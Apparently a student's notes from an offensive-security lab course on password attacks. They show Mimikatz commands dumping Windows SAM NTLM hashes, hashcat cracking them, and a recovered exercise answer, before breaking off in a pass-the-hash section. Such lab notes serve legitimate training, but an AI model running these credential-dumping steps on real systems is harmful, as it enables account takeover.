+Mimikatz provides functions to extract plain-text passwords and password hashes, from various Win sources, and further leverage them in attack vectors like [pass-the-hash](https://en.wikipedia.org/wiki/Pass_the_hash).  Mimikatz **sekurlsa** module extracts hashes from the [Local Security Authority Subsystem (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service).  LSASS is a Win process that handles auth, password change, and [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).
+
+LSASS caches NTLM hashes and other creds, which can be extracted with Mimikatz **sekurlsa** module.  We need to understand that LSASS runs under the SYSTEM user, with higher privs than Administrator.  Therefore, we can only extract passwords if we are running Mimikatz as Administrator or higher, with [SeDebugPrivilege](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113).  This access right allows the debugging of processes we own and those of other users.
+
+We can elevate our privs to SYSTEM with tools like [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or Mimikatz [token elevation function](https://github.com/gentilkiwi/mimikatz/wiki/module-~-token).  The token elevation function requires [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) access right, with all local Admin accounts have by default.
+
+Now let's demonstrate how to obtain and crack NTLM hashes.  We will retrieve passwords from the SAM of the MARKETINGWK01 machine, log in via RDP with the creds provided in the lab machine below.
+- Start with Get-LocalUser
+	- checking wich users exist locally on the system
+```powershell
+PS C:\Users\offsec> Get-LocalUser
+
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+nelly              True
+offsec             True
+sam                True
+WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
+```
+- The output indicates the existence of another user, `nelly`
+	- we will obtain nelly's plain text password by retrieving the NTLM hash and cracking it
+- We know the creds of users are stored when they log on to a Win sys
+	- however, creds are stored in other ways
+		- i.e. when a service is run with a user account
+- We will use Mimikatz to check for stored creds on the system
+	- `C:\tools\mimikatz.exe`
+	- Start PowerShell as Admin
+		- confirm the UAC popup
+	- start Mimikatz
+```powershell
+PS C:\tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz #
+```
+- We can now interact with Mimikatz CLI env
+	- each command consists of a module and command delimited by two colons
+		- i.e. `privilege::debug`
+- We can use various commands to extract passwords from the system
+	- common command to attempt to extract plaintext passwords and password hashes from all source: `sekurlsa::logonpasswords`
+		- *This generates a huge amount of output*
+	- We can instead extract NTLM hashes from SAM with: `lsadump::sam`
+		- first gain SYSTEM privs with: `token::elevate`
+	- Both commands require **SeDebugPrivilege** which we attain with: `privilege::debug`
+```bash
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+652     {0;000003e7} 1 D 41117          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;002189f0} 2 F 3171076     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary.
+ * Thread Token  : {0;000003e7} 1 D 3533913     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : MARKETINGWK01
+SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
+Local SID : S-1-5-21-4264639230-2296035194-3358247000
+
+SAMKey : 38e2cdfccc1d5220e001dd7d9b6186b3
+
+RID  : 000001f4 (500)
+User : Administrator
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: c17a032e0528525ad763c0bec3658226
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : f39c5178d64eb4811f0e24caddc71880
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 98c4bca33a76248827ddb6d7f5af7e5cc31742eab603ef34944cc4055052bb28
+      aes128_hmac       (4096) : f4f2779905636ac6d8a3dbcccd3da7ad
+      des_cbc_md5       (4096) : fe76fd5291a4b0d0
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : fe76fd5291a4b0d0
+
+
+RID  : 000003e9 (1001)
+User : offsec
+  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 4afc51d3706e26bc98dc90db9a50826a
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : MARKETINGWK01offsec
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 84ec02ea2dd7eb6df176b7abf418babc44e3b082a787ccebe386141eae88385e
+      aes128_hmac       (4096) : 32d058faeea4ca20356399fcf099fcbd
+      des_cbc_md5       (4096) : c8e60ecb689e1543
+    OldCredentials
+      aes256_hmac       (4096) : 8d6689fa7fb0321706ad1363167429077dcbfa1ad76e74f95ce2f58993c36eff
+      aes128_hmac       (4096) : 0bdfdee532724ecdb9f09b62dca4e2be
+      des_cbc_md5       (4096) : ab3b75862cc1c4b0
+    OlderCredentials
+      aes256_hmac       (4096) : 00df88a3ea2cc3bac58ea0ced5304301dbcdfb7c9440e3bba8fcaf07522a1902
+      aes128_hmac       (4096) : e967183d09db853175ae40e7a57d72ae
+      des_cbc_md5       (4096) : 9da4c20dad25046b
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : MARKETINGWK01offsec
+    Credentials
+      des_cbc_md5       : c8e60ecb689e1543
+    OldCredentials
+      des_cbc_md5       : ab3b75862cc1c4b0
+
+
+RID  : 000003ea (1002)
+User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 5036485b9af540fede9a4d43ab6fdc26
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : DESKTOP-6OLBM9Onelly
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
+      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
+      des_cbc_md5       (4096) : 7fd6f702615e0e75
+    OldCredentials
+      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
+      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
+      des_cbc_md5       (4096) : 7fd6f702615e0e75
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : DESKTOP-6OLBM9Onelly
+    Credentials
+      des_cbc_md5       : 7fd6f702615e0e75
+    OldCredentials
+      des_cbc_md5       : 7fd6f702615e0e75
+
+
+RID  : 000003ec (1004)
+User : sam
+  Hash NTLM: fa146c495c3c815edd0634d05c9af84a
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 66cddd0487d89de32b89af88a6b241f6
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : MARKETINGWK01sam
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 6e2365f44e0493fbf27a38b27e5379b1222cc2daf3b6ba19e5cdf21f58cbdfc2
+      aes128_hmac       (4096) : e4033c4aa78d497c074b51186337fb44
+      des_cbc_md5       (4096) : 155125d375579ed9
+    OldCredentials
+      aes256_hmac       (4096) : 291f17037d8e5cded6f2a9a3e3f9afe69e31cd467a2028501f5ef55f8ad45a28
+      aes128_hmac       (4096) : e9ac280a18a224ecee35956c0b1c2217
+      des_cbc_md5       (4096) : 83abf758d62ae9d5
+    OlderCredentials
+      aes256_hmac       (4096) : 291f17037d8e5cded6f2a9a3e3f9afe69e31cd467a2028501f5ef55f8ad45a28
+      aes128_hmac       (4096) : e9ac280a18a224ecee35956c0b1c2217
+      des_cbc_md5       (4096) : 83abf758d62ae9d5
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : MARKETINGWK01sam
+    Credentials
+      des_cbc_md5       : 155125d375579ed9
+    OldCredentials
+      des_cbc_md5       : 83abf758d62ae9d5
+```
+- We have obtained the NTLM hash for nelly
+	- `3ae8e5f0ffabb3a627672e1600f1ba10`
+	- we will copy this to `nelly.hash` on our attacking machine
+- Next we get the correct hash mode from Hashcat for OS NTLM
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo -n "3ae8e5f0ffabb3a627672e1600f1ba10" > nelly.hash      
+                                                                                                      
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat nelly.hash 
+3ae8e5f0ffabb3a627672e1600f1ba10                                                                                                      
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat --help | grep -i "ntlm"   
+   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
+  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+   1000 | NTLM                                                       | Operating System
+```
+- the correct mode is `1000`
+- The Mimikatz output is already in a form that Hashcat accepts
+- Next we choose a wordlist and rule file
+	- wordlist `rockyou.txt`
+	- rule `best64.rule`
+		- containing 64 highly effective rules
+- Now we can start our attack
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat (v6.2.6) starting
+
+...
+
+3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
+Time.Started.....: Mon Oct  2 14:45:23 2023, (0 secs)
+Time.Estimated...: Mon Oct  2 14:45:23 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 37229.3 kH/s (8.02ms) @ Accel:512 Loops:77 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 315392/1104517645 (0.03%)
+Rejected.........: 0/315392 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> oooooo
+Hardware.Mon.#1..: Temp: 46c Util: 14%
+
+Started: Mon Oct  2 14:45:08 2023
+Stopped: Mon Oct  2 14:45:25 2023
+```
+- we have retrieved `nicole1` from the NTLM hash
+
+#### Exercises
+
+Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labelled "Password Manager" and leverage the methods from this section to extract the NTLM hash of the user steve. Use best64.rule for the cracking process and enter the plain text password as answer to this exercise.
+```
+nadine:123abc
+
+PS C:\Windows\system32> Get-LocalUser
+
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+nadine             True
+offsec             True
+steve              True
+WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
+
+
+PS C:\Windows\system32> cd C:\tools\
+PS C:\tools> ls
+
+
+    Directory: C:\tools
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          6/9/2022  10:46 AM        1355680 mimikatz.exe
+
+
+PS C:\tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+660     {0;000003e7} 1 D 41061          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;00109ee5} 2 F 1636611     MARKETINGWK02\nadine    S-1-5-21-1351291662-2228892526-3561702016-1002  (15g,24p)       Primary.
+ * Thread Token  : {0;000003e7} 1 D 1719104     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : MARKETINGWK02
+SysKey : d982d74a4314aa6168990a580c61895b
+Local SID : S-1-5-21-1351291662-2228892526-3561702016
+
+SAMKey : 38956749db1b47b14ac065debada022b
+
+RID  : 000001f4 (500)
+User : Administrator
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 2cc63089327244818486ab265b2eddd3
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 5affaf321a7392186452f80177ab463a
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 8d23d32512522ee020ddac99dcad9a0215eb6e5c19f23c5070574df682cf8e5f
+      aes128_hmac       (4096) : 6f2b71f56a595b586623c354dd1079bc
+      des_cbc_md5       (4096) : 98a11a31fb7fe0f1
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 98a11a31fb7fe0f1
+
+
+RID  : 000003e9 (1001)
+User : offsec
+  Hash NTLM: 6a3d7967d4e22d117e55f680e634243f
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 16a117dbbd35bc36281a058e966493c3
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : MARKETINGWK02offsec
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 2ae6ea07e0f475f1c56439a7cb698b0f0b9372edb6965ba65f63268f123ca1fd
+      aes128_hmac       (4096) : 044528364695577339a23a1013c581b0
+      des_cbc_md5       (4096) : 266b8aabef048a51
+    OldCredentials
+      aes256_hmac       (4096) : d010fa7c705c674e447bcc39ce8e8133172a82f84f6cad3966e1bc99a17927b8
+      aes128_hmac       (4096) : d6be041bafd388d11eee9294faa06705
+      des_cbc_md5       (4096) : 6dd62ca2648aa1d5
+    OlderCredentials
+      aes256_hmac       (4096) : d010fa7c705c674e447bcc39ce8e8133172a82f84f6cad3966e1bc99a17927b8
+      aes128_hmac       (4096) : d6be041bafd388d11eee9294faa06705
+      des_cbc_md5       (4096) : 6dd62ca2648aa1d5
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : MARKETINGWK02offsec
+    Credentials
+      des_cbc_md5       : 266b8aabef048a51
+    OldCredentials
+      des_cbc_md5       : 6dd62ca2648aa1d5
+
+
+RID  : 000003ea (1002)
+User : nadine
+  Hash NTLM: 89c99393bfe3c0a95deba6dcb0b12b43
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 8d103edb14cf45862a8c056a354ea80a
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : MARKETINGWK02nadine
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 83769de79fd8fc6aa9af291b3a5f9c1684d5889f4d28338b977911a369ab8dcd
+      aes128_hmac       (4096) : b1a88ab20cf01ac9d10e80981a2aa5b7
+      des_cbc_md5       (4096) : 45f7e5ea89913132
+    OldCredentials
+      aes256_hmac       (4096) : 7cfc2fbf3959cc45d0b1ea4356c45b643a46981dfa51d2b9e244ec4bd6f89659
+      aes128_hmac       (4096) : f34301cb7153abe94b2d5cc3930cc71a
+      des_cbc_md5       (4096) : df685ef20e25c745
+    OlderCredentials
+      aes256_hmac       (4096) : 58f99d56621643a47c4f162bb057c73a94473c93451845138c0e43aa60e3e4af
+      aes128_hmac       (4096) : ca151e22b97e712965f0f1a0dc60972b
+      des_cbc_md5       (4096) : c71ca85740073768
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : MARKETINGWK02nadine
+    Credentials
+      des_cbc_md5       : 45f7e5ea89913132
+    OldCredentials
+      des_cbc_md5       : df685ef20e25c745
+
+
+RID  : 000003eb (1003)
+User : steve
+  Hash NTLM: 2835573fb334e3696ef62a00e5cf7571
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : c57d7dbfb2d3a39dd092e194e6d7cb80
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : MARKETINGWK02steve
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 69904d88b9cd87161959a23213caf606703dd0542a3072aacb436fb0da1518d7
+      aes128_hmac       (4096) : 8231095f3282868b2d4037e9ae63af5f
+      des_cbc_md5       (4096) : 1c4f2a7f58e3459b
+    OldCredentials
+      aes256_hmac       (4096) : 69904d88b9cd87161959a23213caf606703dd0542a3072aacb436fb0da1518d7
+      aes128_hmac       (4096) : 8231095f3282868b2d4037e9ae63af5f
+      des_cbc_md5       (4096) : 1c4f2a7f58e3459b
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : MARKETINGWK02steve
+    Credentials
+      des_cbc_md5       : 1c4f2a7f58e3459b
+    OldCredentials
+      des_cbc_md5       : 1c4f2a7f58e3459b
+	  
+	  
+### Crack steve:2835573fb334e3696ef62a00e5cf7571
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat --help | grep -i "ntlm"                                      
+   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
+  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+   1000 | NTLM                                                       | Operating System
+   
+   
+### Attack with Hashcat
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo -n "2835573fb334e3696ef62a00e5cf7571" > steve.hash
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat steve.hash            
+2835573fb334e3696ef62a00e5cf7571                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 14844/29752 MB (4096 MB allocatable), 8MCU.
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 77
+
+Optimizers applied:
+* Zero-Byte.
+* Early-Skip.
+* Not-Salted.
+* Not-Iterated.
+* Single-Hash.
+* Single-Salt.
+* Raw-Hash.
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt.
+* Passwords.: 14344385.
+* Bytes.....: 139921507.
+* Keyspace..: 1104517645.
+
+2835573fb334e3696ef62a00e5cf7571:francesca77              
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+Hash.Target......: 2835573fb334e3696ef62a00e5cf7571
+Time.Started.....: Mon Oct  2 15:54:13 2023, (0 secs)
+Time.Estimated...: Mon Oct  2 15:54:13 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 37112.9 kH/s (7.90ms) @ Accel:512 Loops:77 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 315392/1104517645 (0.03%)
+Rejected.........: 0/315392 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> oooooo
+Hardware.Mon.#1..: Temp: 39c Util: 21%
+
+Started: Mon Oct  2 15:54:12 2023
+Stopped: Mon Oct  2 15:54:15 2023
+
+### Retrieved steve:francesca77
+```
+
+
+### Passing NTLM
+
+Previously we obtained NTLM hashes and cracked them, in some cases this may not be feasible due to complexity or available time.  We will now demonstrate how to leverage a NTLM hash without cracking it!
+
+- Pass-the-hash (PtH)
+	- can be used to authenticate to a local or remote target with a valid username and NTLM hash instead of a cleartext password.
+	- possible because NTLM hashes are not salted
+		- they remain static between sessions
+	- if we obtain a password hash on one target
+		- it can be used for auth on that target
+		- as well as other targets that user account has access to
+			- for code execution the account needs admin privs on that system
+- if not a local Administrator user hash
+	- the target needs to be configured in a specific way to obtain code exec
+	- Since Win Vista [UAC remote Restrictions](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) are enabled by default
+		- preventing software commands from running with administrative rights on remote systems
+		- mitigating the attack for users in the administrators group aside from the local **Administrator** account.
+
+In this example assume we gained access to FILES01 and obtain the password for a user,  `gunther:password123!`, then start Win Explorer and enter the path of the SMB share `\\192.168.X.X\secrets` in the nav bar.  We are prompted for creds to connect to the share, enter the creds for the gunther user, and are notified that Win cannot access this share.  This is due to the user account lacking permissions for the share.  We can use Mimikatz to obtain the NTLM hash of Administrator as we did previously.
+- `./mimikatz.exe`
+- `privilege::debug`
+- `token::elevate`
+- `lsadump::sam`
+```powershell
+PS C:\tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+572     {0;000003e7} 1 D 38730          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;000f2af4} 2 F 1552514     FILES01\gunther S-1-5-21-1555802299-1328189896-734683769-1006   (15g,24p)       Primary.
+ * Thread Token  : {0;000003e7} 1 D 1636558     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : FILES01
+SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
+Local SID : S-1-5-21-1555802299-1328189896-734683769
+
+SAMKey : 201b0e3078f2be635aaaa055ab5a7828
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 4527db0dd1cadde9fb0798b223c04148
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : WIN-18A8VEVFGCEAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : d017c08af003b40d014a9e52cefbe055f73d61892c7a269c0698c2a631836656
+      aes128_hmac       (4096) : b43bf0498342636ebecbd4de4e30b2b5
+      des_cbc_md5       (4096) : 5dad153d75b91597
+    OldCredentials
+      aes256_hmac       (4096) : 2e9865ec6735e05360b6c4e9622cdb5afcc666bf4aa87fc47dec7e4f0a63ce1b
+      aes128_hmac       (4096) : 3ec98a00ba75d9decdb5e24a5714f1b6
+      des_cbc_md5       (4096) : 9b3802fea710c7d6
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : WIN-18A8VEVFGCEAdministrator
+    Credentials
+      des_cbc_md5       : 5dad153d75b91597
+    OldCredentials
+      des_cbc_md5       : 9b3802fea710c7d6
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 36600e1b78cd803577d3e1bcbba8f143
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 530acc84603eaf07bccb57dd892e2641
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 5cc877b22751e481e13966dbd4f234e246a21a680c56ac794b0905a3fb265202
+      aes128_hmac       (4096) : 0dda4de589f0d59b38dde385d3601257
+      des_cbc_md5       (4096) : 94ce2613150d4308
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 94ce2613150d4308
+
+
+RID  : 000003ee (1006)
+User : gunther
+  Hash NTLM: 8119935c5f7fa5f57135620c8073aaca
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 48af726e5abdd5fa3533f2491bc10305
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : WIN-18A8VEVFGCEgunther
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 3642af9f526272f78daacfdae3ed361ab03c913110a0a2812320e308c38c33af
+      aes128_hmac       (4096) : db6f81ffa97ff4185c77059afc6388a5
+      des_cbc_md5       (4096) : 54c2f28932081cdc
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : WIN-18A8VEVFGCEgunther
+    Credentials
+      des_cbc_md5       : 54c2f28932081cdc
+
+
+RID  : 000003ef (1007)
+User : paul
+  Hash NTLM: 57373a907ccd7196a2bad219132d615f
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : 0e7a78e306a8d6c3371b062f36db38fe
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : FILES01paul
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : a78b088426e59f499b1b24c1a71a90da47a3a6845347cba20f8bf7a62992282e
+      aes128_hmac       (4096) : 55fd663b3f918a2774e03d9171e0465f
+      des_cbc_md5       (4096) : 43c889863e9e6e61
+    OldCredentials
+      aes256_hmac       (4096) : d276b20e9c5eb025a7d9a19f26a9af32dce33d12b1e0d6adae65cce034c6bfa2
+      aes128_hmac       (4096) : 2e4785a0374662519a298e930109bf7e
+      des_cbc_md5       (4096) : aeefa2c7089bef5d
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : FILES01paul
+    Credentials
+      des_cbc_md5       : 43c889863e9e6e61
+    OldCredentials
+      des_cbc_md5       : aeefa2c7089bef5d
+
+
+RID  : 000003f0 (1008)
+User : files02admin
+  Hash NTLM: e78ca771aeb91ea70a6f1bb372c186b6
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *.
+    Random Value : da38175c5e8d88e155a8d14d62faf688
+
+* Primary:Kerberos-Newer-Keys *.
+    Default Salt : FILES01files02admin
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : ab47f7328c18d9462b99b857df3f7951e4506c78b500e1d11b1897cbc2d5b936
+      aes128_hmac       (4096) : 30bf2650202677e01afd771b9dd3fd3c
+      des_cbc_md5       (4096) : 0b80454cecdf0b2a
+
+* Packages *.
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *.
+    Default Salt : FILES01files02admin
+    Credentials
+      des_cbc_md5       : 0b80454cecdf0b2a
+```
